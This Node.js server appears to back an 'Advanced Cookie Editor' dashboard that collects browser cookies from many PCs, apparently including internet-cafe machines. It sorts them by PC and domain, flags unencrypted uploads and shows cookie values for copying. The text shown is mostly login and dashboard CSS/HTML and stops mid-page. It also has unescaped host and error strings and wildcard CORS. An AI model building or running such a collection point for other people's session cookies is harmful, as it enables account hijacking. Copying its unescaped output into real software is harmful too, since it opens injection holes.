/**
 * Advanced Cookie Editor - Central Dashboard & Synchronization Server
 * Domain: https://erul.web.id/ & https://warnet.web.id/cookies
 * Organizes cookies per PC, per Domain, with Password status indicators.
 * Zero external dependencies (native Node.js http, fs, path, url).
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const crypto = require('crypto');

let db = null;
try {
  db = require('./db');
} catch (e) {
  console.log('[-] db module not loaded:', e.message);
}

// Active session store (memory store with 7 days TTL)
const activeSessions = new Map();

function parseCookies(req) {
  const list = {};
  const cookieHeader = req.headers.cookie;
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach(cookie => {
    let [name, ...rest] = cookie.split('=');
    name = name?.trim();
    if (!name) return;
    const value = rest.join('=').trim();
    list[name] = decodeURIComponent(value);
  });
  return list;
}

function getSessionUser(req) {
  const cookies = parseCookies(req);
  const token = cookies.ace_session;
  if (!token) {
    const auth = req.headers.authorization;
    if (auth && auth.startsWith('Bearer ')) {
      const bearerToken = auth.slice(7).trim();
      const sess = activeSessions.get(bearerToken);
      if (sess && sess.expiresAt > Date.now()) return sess.user;
    }
    return null;
  }
  const sess = activeSessions.get(token);
  if (!sess) return null;
  if (sess.expiresAt < Date.now()) {
    activeSessions.delete(token);
    return null;
  }
  return sess.user;
}

function createSession(user) {
  const token = 'ace_' + crypto.randomBytes(24).toString('hex');
  const maxAgeMs = 7 * 24 * 60 * 60 * 1000; // 7 days
  activeSessions.set(token, {
    user,
    createdAt: Date.now(),
    expiresAt: Date.now() + maxAgeMs
  });
  return { token, maxAgeMs };
}

const PORT = 8099;
const DATA_DIR = path.join(__dirname, 'data');
const MAX_BACKUPS = 500;

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, X-PC-Name, X-Client-Name');
}

function sendJson(res, statusCode, data, isHead = false) {
  setCors(res);
  const payload = JSON.stringify(data);
  res.writeHead(statusCode, {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  });
  if (!isHead) res.end(payload);
  else res.end();
}

function sendHtml(res, html, isHead = false) {
  setCors(res);
  const len = Buffer.byteLength(html, 'utf8');
  res.writeHead(200, {
    'Content-Type': 'text/html; charset=utf-8',
    'Content-Length': len
  });
  if (!isHead) res.end(html);
  else res.end();
}

// Helper to extract clean domain
function cleanDomain(d) {
  if (!d) return 'unknown';
  return d.replace(/^\.+/, '').trim().toLowerCase();
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Read and parse all backups
function loadAllRecords() {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
  const records = [];

  for (const f of files) {
    try {
      const fullPath = path.join(DATA_DIR, f);
      const raw = fs.readFileSync(fullPath, 'utf8');
      const data = JSON.parse(raw);

      // Determine PC Name
      let pcName = data.pcName || data.pc || data.metadata?.pc || data.metadata?.pcName || data.metadata?.client || data.payload?.metadata?.client || data.payload?.metadata?.pc;
      if (!pcName || pcName === 'unknown' || pcName.trim() === '') {
        pcName = data.clientIp ? `PC-${data.clientIp.split('.').pop()}` : 'PC-01';
      }

      // Determine Encryption & Password status
      const isEncrypted = Boolean(data.isEncrypted || data.passwordProtected || data.payload?.format === 'advanced-cookie-editor-encrypted');

      // Extract cookies list
      let cookies = [];
      if (Array.isArray(data.cookies)) {
        cookies = data.cookies;
      } else if (Array.isArray(data.payload?.cookies)) {
        cookies = data.payload.cookies;
      } else if (Array.isArray(data.payload)) {
        cookies = data.payload;
      }

      // Collect domains in this record
      const domains = new Set();
      if (data.domain && data.domain !== 'all') {
        domains.add(cleanDomain(data.domain));
      }
      for (const c of cookies) {
        if (c && c.domain) {
          domains.add(cleanDomain(c.domain));
        }
      }

      records.push({
        id: data.id || f.replace('.json', ''),
        pcName: pcName.trim(),
        clientIp: data.clientIp || '127.0.0.1',
        savedAt: data.savedAt || new Date().toISOString(),
        isEncrypted,
        passwordProtected: isEncrypted,
        itemCount: cookies.length > 0 ? cookies.length : (data.itemCount || 0),
        domains: Array.from(domains),
        cookies,
        rawPayload: data.payload || data
      });
    } catch (_) {}
  }

  return records.sort((a, b) => new Date(b.savedAt) - new Date(a.savedAt));
}

function rotateBackups() {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
  if (files.length > MAX_BACKUPS) {
    const sorted = files.map(f => ({
      name: f,
      time: fs.statSync(path.join(DATA_DIR, f)).mtimeMs
    })).sort((a, b) => a.time - b.time);

    while (sorted.length > MAX_BACKUPS) {
      const oldest = sorted.shift();
      try {
        fs.unlinkSync(path.join(DATA_DIR, oldest.name));
      } catch {}
    }
  }
}

// Generate Professional CMS Login Page HTML
function getLoginHtml(currentHost = 'erul.my.id', errorMsg = '') {
  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login CMS — Cookie Editor Dashboard (${currentHost})</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <style>
    :root {
      --bg-base: #06080d;
      --bg-surface: #0e121b;
      --bg-surface-elevated: #151a26;
      --bg-input: #1a2030;
      --border-subtle: rgba(255, 255, 255, 0.08);
      --border-focus: #3b82f6;
      --primary: #3b82f6;
      --primary-hover: #2563eb;
      --primary-glow: rgba(59, 130, 246, 0.35);
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
      --success: #10b981;
      --danger: #ef4444;
      --danger-bg: rgba(239, 68, 68, 0.12);
      --warning: #f59e0b;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: var(--bg-base);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 24px;
      position: relative;
      overflow-x: hidden;
    }

    /* Ambient luxury background glow */
    body::before {
      content: '';
      position: fixed;
      top: -20%;
      left: 50%;
      transform: translateX(-50%);
      width: 700px;
      height: 700px;
      background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, rgba(16, 185, 129, 0.05) 40%, transparent 70%);
      pointer-events: none;
      z-index: 0;
    }

    body::after {
      content: '';
      position: fixed;
      bottom: -15%;
      right: -10%;
      width: 500px;
      height: 500px;
      background: radial-gradient(circle, rgba(245, 158, 11, 0.08) 0%, transparent 70%);
      pointer-events: none;
      z-index: 0;
    }

    .login-container {
      width: 100%;
      max-width: 440px;
      position: relative;
      z-index: 1;
    }

    /* Professional Card */
    .login-card {
      background: linear-gradient(145deg, rgba(17, 22, 33, 0.95), rgba(12, 16, 25, 0.98));
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid var(--border-subtle);
      border-radius: 20px;
      padding: 40px 36px 32px;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.65), 0 0 0 1px rgba(255, 255, 255, 0.05);
      position: relative;
      overflow: hidden;
    }

    .login-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, #3b82f6, #10b981, #f59e0b);
    }

    /* Brand Header */
    .brand-header {
      text-align: center;
      margin-bottom: 28px;
    }

    .brand-avatar {
      width: 68px;
      height: 68px;
      margin: 0 auto 16px;
      background: linear-gradient(135deg, rgba(59, 130, 246, 0.15), rgba(245, 158, 11, 0.2));
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 18px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #f59e0b;
      font-size: 28px;
      box-shadow: 0 12px 24px -6px rgba(245, 158, 11, 0.25);
      transition: transform 0.3s ease;
    }

    .brand-avatar:hover {
      transform: scale(1.05) rotate(5deg);
    }

    .brand-title {
      font-size: 22px;
      font-weight: 800;
      letter-spacing: -0.5px;
      color: var(--text-main);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .cms-pill {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      font-weight: 600;
      background: rgba(59, 130, 246, 0.15);
      color: #60a5fa;
      border: 1px solid rgba(59, 130, 246, 0.3);
      padding: 3px 8px;
      border-radius: 6px;
      letter-spacing: 0.2px;
    }

    .brand-subtitle {
      font-size: 13px;
      color: var(--text-muted);
      margin-top: 6px;
      line-height: 1.4;
    }

    /* Error Alert */
    .alert-error {
      background: var(--danger-bg);
      border: 1px solid rgba(239, 68, 68, 0.3);
      color: #fca5a5;
      padding: 12px 14px;
      border-radius: 10px;
      font-size: 13px;
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
      animation: shake 0.35s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }

    /* Form Fields */
    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 8px;
    }

    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }

    .input-icon {
      position: absolute;
      left: 14px;
      color: var(--text-dim);
      font-size: 14px;
      pointer-events: none;
      transition: color 0.2s ease;
    }

    .form-input {
      width: 100%;
      height: 46px;
      background: var(--bg-input);
      border: 1px solid var(--border-subtle);
      border-radius: 10px;
      padding: 0 42px 0 40px;
      color: var(--text-main);
      font-family: inherit;
      font-size: 14px;
      transition: all 0.2s ease;
    }

    .form-input:focus {
      outline: none;
      border-color: var(--border-focus);
      background: var(--bg-surface-elevated);
      box-shadow: 0 0 0 3px var(--primary-glow);
    }

    .input-wrapper:focus-within .input-icon {
      color: var(--primary);
    }

    .btn-toggle-pw {
      position: absolute;
      right: 12px;
      background: none;
      border: none;
      color: var(--text-dim);
      font-size: 14px;
      cursor: pointer;
      padding: 6px;
      border-radius: 6px;
      transition: color 0.2s ease;
    }

    .btn-toggle-pw:hover {
      color: var(--text-main);
    }

    /* Options row */
    .form-options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      font-size: 13px;
    }

    .checkbox-wrap {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      color: var(--text-muted);
      user-select: none;
    }

    .checkbox-wrap input {
      accent-color: var(--primary);
      width: 16px;
      height: 16px;
      border-radius: 4px;
      cursor: pointer;
    }

    .badge-mysql {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      font-size: 11px;
      color: #10b981;
      background: rgba(16, 185, 129, 0.12);
      border: 1px solid rgba(16, 185, 129, 0.25);
      padding: 3px 8px;
      border-radius: 12px;
      font-weight: 600;
    }

    /* Submit Button */
    .btn-submit {
      width: 100%;
      height: 48px;
      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
      color: white;
      border: none;
      border-radius: 10px;
      font-family: inherit;
      font-size: 14px;
      font-weight: 700;
      letter-spacing: 0.3px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      cursor: pointer;
      box-shadow: 0 8px 20px -4px rgba(59, 130, 246, 0.5);
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .btn-submit:hover {
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      transform: translateY(-1px);
      box-shadow: 0 12px 24px -4px rgba(59, 130, 246, 0.65);
    }

    .btn-submit:active {
      transform: translateY(1px);
    }

    /* Footer System Status */
    .system-status {
      margin-top: 24px;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 12px;
      color: var(--text-dim);
    }

    .pulse-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #10b981;
      box-shadow: 0 0 8px #10b981;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(0.9); opacity: 0.7; }
      50% { transform: scale(1.3); opacity: 1; }
      100% { transform: scale(0.9); opacity: 0.7; }
    }

    .copyright {
      margin-top: 24px;
      text-align: center;
      font-size: 11px;
      color: var(--text-dim);
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="login-card">
      <div class="brand-header">
        <div class="brand-avatar">
          <i class="fa-solid fa-cookie-bite"></i>
        </div>
        <div class="brand-title">
          <span>Cookie CMS</span>
          <span class="cms-pill"><i class="fa-solid fa-shield-halved"></i> ${currentHost}</span>
        </div>
        <p class="brand-subtitle">Portal Manajemen & Monitoring Cookie Realtime Multi-PC</p>
      </div>

      ${errorMsg ? `
      <div class="alert-error">
        <i class="fa-solid fa-circle-exclamation"></i>
        <span>${errorMsg}</span>
      </div>` : ''}

      <form action="/login" method="POST">
        <div class="form-group">
          <label class="form-label" for="username"><i class="fa-solid fa-user-gear"></i> Username / Operator</label>
          <div class="input-wrapper">
            <i class="fa-solid fa-user input-icon"></i>
            <input type="text" id="username" name="username" class="form-input" placeholder="admin atau nama operator" required autofocus autocomplete="username">
          </div>
        </div>

        <div class="form-group">
          <label class="form-label" for="password"><i class="fa-solid fa-key"></i> Kata Sandi</label>
          <div class="input-wrapper">
            <i class="fa-solid fa-lock input-icon"></i>
            <input type="password" id="password" name="password" class="form-input" placeholder="••••••••" required autocomplete="current-password">
            <button type="button" class="btn-toggle-pw" id="btn-toggle-pw" title="Tampilkan sandi">
              <i class="fa-solid fa-eye" id="eye-icon"></i>
            </button>
          </div>
        </div>

        <div class="form-options">
          <label class="checkbox-wrap">
            <input type="checkbox" name="remember" checked>
            <span>Ingat sesi saya</span>
          </label>
          <span class="badge-mysql"><i class="fa-solid fa-database"></i> MySQL Live</span>
        </div>

        <button type="submit" class="btn-submit" id="btn-submit">
          <i class="fa-solid fa-arrow-right-to-bracket"></i>
          <span>Masuk ke Dashboard CMS</span>
        </button>
      </form>

      <div class="system-status">
        <span class="pulse-dot"></span>
        <span>Sistem Realtime 5s • MariaDB Storage Aktif</span>
      </div>
    </div>

    <div class="copyright">
      <i class="fa-solid fa-code"></i> Advanced Cookie Editor v2.1.0 • Enterprise CMS Portal
    </div>
  </div>

  <script>
    const pwInput = document.getElementById('password');
    const toggleBtn = document.getElementById('btn-toggle-pw');
    const eyeIcon = document.getElementById('eye-icon');

    if (toggleBtn && pwInput) {
      toggleBtn.addEventListener('click', () => {
        const isPassword = pwInput.getAttribute('type') === 'password';
        pwInput.setAttribute('type', isPassword ? 'text' : 'password');
        eyeIcon.className = isPassword ? 'fa-solid fa-eye-slash' : 'fa-solid fa-eye';
      });
    }
  </script>
</body>
</html>`;
}

// Generate Dashboard HTML Single Page Application
function getDashboardHtml(currentHost = 'erul.my.id', user = { displayName: 'Administrator', role: 'super_admin' }) {
  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard Cookie Editor — ${currentHost}</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <style>
    :root {
      --bg-dark: #0a0c10;
      --bg-card: #12151d;
      --bg-card-hover: #171b26;
      --bg-input: #1a1e2b;
      --border: #232838;
      --border-focus: #3b82f6;
      --text-main: #f1f5f9;
      --text-muted: #8e9bb0;
      --accent: #3b82f6;
      --accent-glow: rgba(59, 130, 246, 0.2);
      --green: #10b981;
      --green-bg: rgba(16, 185, 129, 0.12);
      --amber: #f59e0b;
      --amber-bg: rgba(245, 158, 11, 0.12);
      --red: #ef4444;
      --red-bg: rgba(239, 68, 68, 0.12);
      --purple: #8b5cf6;
      --purple-bg: rgba(139, 92, 246, 0.12);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Plus Jakarta Sans', sans-serif;
      background: var(--bg-dark);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Top Bar */
    .topbar {
      background: rgba(18, 21, 29, 0.85);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
      padding: 12px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 50;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      text-decoration: none;
      color: inherit;
    }
    .brand-icon {
      font-size: 26px;
      background: linear-gradient(135deg, #f59e0b, #d97706);
      width: 42px;
      height: 42px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
    }
    .brand-title {
      font-size: 17px;
      font-weight: 800;
      letter-spacing: -0.3px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .brand-badge {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      background: rgba(59, 130, 246, 0.15);
      color: var(--accent);
      padding: 2px 8px;
      border-radius: 6px;
      border: 1px solid rgba(59, 130, 246, 0.3);
    }
    .brand-host {
      font-size: 12px;
      color: var(--text-muted);
    }

    /* Stats Counter */
    .stats-bar {
      display: flex;
      gap: 16px;
      align-items: center;
    }
    .stat-pill {
      display: flex;
      align-items: center;
      gap: 8px;
      background: var(--bg-card);
      border: 1px solid var(--border);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
    }
    .stat-val {
      font-family: 'JetBrains Mono', monospace;
      color: var(--accent);
      font-weight: 700;
    }
    .stat-pill.green .stat-val { color: var(--green); }
    .stat-pill.amber .stat-val { color: var(--amber); }

    /* Controls */
    .topbar-actions {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 8px 16px;
      border-radius: 10px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid transparent;
      transition: all 0.2s;
      text-decoration: none;
    }
    .btn-primary {
      background: var(--accent);
      color: white;
    }
    .btn-primary:hover {
      background: #2563eb;
      box-shadow: 0 4px 14px var(--accent-glow);
    }
    .btn-secondary {
      background: var(--bg-card);
      border-color: var(--border);
      color: var(--text-main);
    }
    .btn-secondary:hover {
      background: var(--bg-card-hover);
      border-color: #3b4255;
    }
    .btn-sm { padding: 6px 12px; font-size: 12px; border-radius: 8px; }
    .btn-danger { background: var(--red-bg); color: var(--red); border-color: rgba(239, 68, 68, 0.3); }
    .btn-danger:hover { background: var(--red); color: white; }

    /* Main Container */
    .dashboard-layout {
      flex: 1;
      display: grid;
      grid-template-columns: 320px 1fr;
      gap: 20px;
      padding: 20px 24px;
      max-width: 1700px;
      margin: 0 auto;
      width: 100%;
    }

    /* Left Sidebar: PC Devices */
    .pc-sidebar {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      height: calc(100vh - 100px);
      position: sticky;
      top: 80px;
    }
    .pc-sidebar-header {
      padding: 16px;
      border-bottom: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .pc-sidebar-title {
      font-size: 14px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-muted);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .search-input {
      width: 100%;
      background: var(--bg-input);
      border: 1px solid var(--border);
      color: var(--text-main);
      padding: 8px 12px;
      border-radius: 8px;
      font-size: 13px;
      outline: none;
      transition: border 0.2s;
    }
    .search-input:focus {
      border-color: var(--border-focus);
    }

    .pc-list {
      flex: 1;
      overflow-y: auto;
      padding: 10px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .pc-item {
      background: var(--bg-dark);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px 14px;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .pc-item:hover {
      background: var(--bg-card-hover);
      border-color: #3b4255;
      transform: translateY(-1px);
    }
    .pc-item.active {
      border-color: var(--accent);
      background: rgba(59, 130, 246, 0.08);
      box-shadow: 0 4px 16px rgba(59, 130, 246, 0.15);
    }
    .pc-item-head {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .pc-name {
      font-weight: 700;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .pc-count {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      background: rgba(255, 255, 255, 0.08);
      padding: 2px 8px;
      border-radius: 12px;
      color: var(--text-muted);
    }
    .pc-item-meta {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      color: var(--text-muted);
    }
    .badge {
      font-size: 10px;
      font-weight: 700;
      padding: 2px 6px;
      border-radius: 6px;
      text-transform: uppercase;
    }
    .badge-plain {
      background: var(--green-bg);
      color: var(--green);
      border: 1px solid rgba(16, 185, 129, 0.3);
    }
    .badge-encrypted {
      background: var(--amber-bg);
      color: var(--amber);
      border: 1px solid rgba(245, 158, 11, 0.3);
    }

    /* Main Content Area */
    .content-area {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    /* Active PC Header Card */
    .active-header-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 16px;
    }
    .active-info h1 {
      font-size: 22px;
      font-weight: 800;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .active-meta {
      margin-top: 6px;
      display: flex;
      gap: 16px;
      font-size: 13px;
      color: var(--text-muted);
    }
    .active-actions {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    /* Domain Pills Container */
    .domain-pills-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 14px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .domain-pills-label {
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-muted);
    }
    .domain-pills {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
    }
    .domain-pill {
      background: var(--bg-dark);
      border: 1px solid var(--border);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .domain-pill:hover {
      background: var(--bg-card-hover);
      border-color: #3b4255;
    }
    .domain-pill.active {
      background: var(--accent);
      border-color: var(--accent);
      color: white;
      box-shadow: 0 2px 10px var(--accent-glow);
    }
    .domain-pill-badge {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      background: rgba(255, 255, 255, 0.15);
      padding: 1px 6px;
      border-radius: 10px;
    }

    /* Cookies Table Card */
    .cookies-table-card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }
    .table-toolbar {
      padding: 14px 18px;
      border-bottom: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
    }
    .table-search {
      flex: 1;
      max-width: 360px;
    }
    .table-filter-group {
      display: flex;
      gap: 8px;
    }

    /* Table Styles */
    .table-wrapper {
      overflow-x: auto;
      max-height: 600px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      text-align: left;
      font-size: 13px;
    }
    th {
      background: rgba(10, 12, 16, 0.6);
      padding: 12px 16px;
      color: var(--text-muted);
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 10;
    }
    td {
      padding: 14px 16px;
      border-bottom: 1px solid var(--border);
      vertical-align: middle;
    }
    tr:hover td {
      background: rgba(255, 255, 255, 0.02);
    }
    .cookie-name {
      font-family: 'JetBrains Mono', monospace;
      font-weight: 700;
      color: #93c5fd;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .cookie-val-box {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      background: var(--bg-dark);
      padding: 4px 8px;
      border-radius: 6px;
      border: 1px solid var(--border);
      max-width: 260px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 6px;
    }
    .val-text {
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .copy-icon-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: var(--text-muted);
      font-size: 12px;
      padding: 2px 4px;
      border-radius: 4px;
    }
    .copy-icon-btn:hover {
      color: white;
      background: rgba(255, 255, 255, 0.1);
    }

    .flag-pills {
      display: flex;
      gap: 4px;
      flex-wrap: wrap;
    }
    .flag {
      font-size: 10px;
      font-weight: 700;
      padding: 2px 5px;
      border-radius: 4px;
      text-transform: uppercase;
    }
    .flag-sec { background: var(--green-bg); color: var(--green); }
    .flag-http { background: var(--purple-bg); color: var(--purple); }
    .flag-same { background: rgba(59, 130, 246, 0.12); color: #60a5fa; }

    /* Empty state */
    .empty-state {
      padding: 60px 20px;
      text-align: center;
      color: var(--text-muted);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }
    .empty-icon { font-size: 42px; opacity: 0.6; }

    /* Instructions Modal / Box */
    .info-banner {
      background: linear-gradient(135deg, rgba(59, 130, 246, 0.08), rgba(16, 185, 129, 0.08));
      border: 1px solid rgba(59, 130, 246, 0.2);
      border-radius: 14px;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 16px;
    }
    .info-banner-text h4 { font-size: 14px; font-weight: 700; margin-bottom: 4px; }
    .info-banner-text p { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
    .code-chip {
      font-family: 'JetBrains Mono', monospace;
      background: var(--bg-dark);
      padding: 2px 6px;
      border-radius: 4px;
      color: #93c5fd;
      border: 1px solid var(--border);
    }

    /* Modal */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 100;
      padding: 20px;
    }
    .modal-overlay.open { display: flex; }
    .modal {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 18px;
      width: 100%;
      max-width: 580px;
      padding: 24px;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .modal-title { font-size: 18px; font-weight: 700; }
    .close-btn { background: none; border: none; color: var(--text-muted); font-size: 20px; cursor: pointer; }

    /* Responsive */
    @media (max-width: 900px) {
      .dashboard-layout { grid-template-columns: 1fr; }
      .pc-sidebar { height: auto; position: static; }
    }
  </style>
</head>
<body>

  <!-- Top Bar -->
  <header class="topbar">
    <a href="/" class="brand">
      <div class="brand-icon">🍪</div>
      <div>
        <div class="brand-title">
          <span>Cookie Editor Dashboard</span>
          <span class="brand-badge">${currentHost}</span>
        </div>
        <div class="brand-host">Central Realtime Multi-PC Cookie Inspector</div>
      </div>
    </a>

    <!-- Stats -->
    <div class="stats-bar">
      <div class="stat-pill">
        <span><i class="fa-solid fa-desktop"></i> PC:</span>
        <span class="stat-val" id="stat-pcs">0</span>
      </div>
      <div class="stat-pill">
        <span><i class="fa-solid fa-globe"></i> Domain:</span>
        <span class="stat-val" id="stat-domains">0</span>
      </div>
      <div class="stat-pill">
        <span><i class="fa-solid fa-cookie-bite"></i> Total:</span>
        <span class="stat-val" id="stat-total-cookies">0</span>
      </div>
      <div class="stat-pill green">
        <span><i class="fa-solid fa-lock-open"></i> Tanpa Password:</span>
        <span class="stat-val" id="stat-plain">0</span>
      </div>
      <div class="stat-pill amber">
        <span><i class="fa-solid fa-lock"></i> Ada Password:</span>
        <span class="stat-val" id="stat-encrypted">0</span>
      </div>
    </div>

    <!-- Actions -->
    <div class="topbar-actions">
      <button class="btn btn-secondary btn-sm" id="btn-refresh" onclick="fetchData()">
        <i class="fa-solid fa-rotate"></i> Refresh
      </button>
      <button class="btn btn-primary btn-sm" onclick="openApiGuideModal()">
        <i class="fa-solid fa-rocket"></i> Cara Kirim
      </button>
      <div style="display: flex; align-items: center; gap: 8px; margin-left: 6px; padding-left: 10px; border-left: 1px solid var(--border);">
        <span style="display: inline-flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 600; color: #93c5fd; background: var(--bg-card); padding: 5px 10px; border-radius: 20px; border: 1px solid var(--border);">
          <i class="fa-solid fa-user-shield"></i>
          <span>${escapeHtml(user.displayName || user.username || 'Admin')}</span>
        </span>
        <a href="/logout" class="btn btn-danger btn-sm" title="Keluar dari CMS" style="text-decoration: none;">
          <i class="fa-solid fa-right-from-bracket"></i> Keluar
        </a>
      </div>
    </div>
  </header>

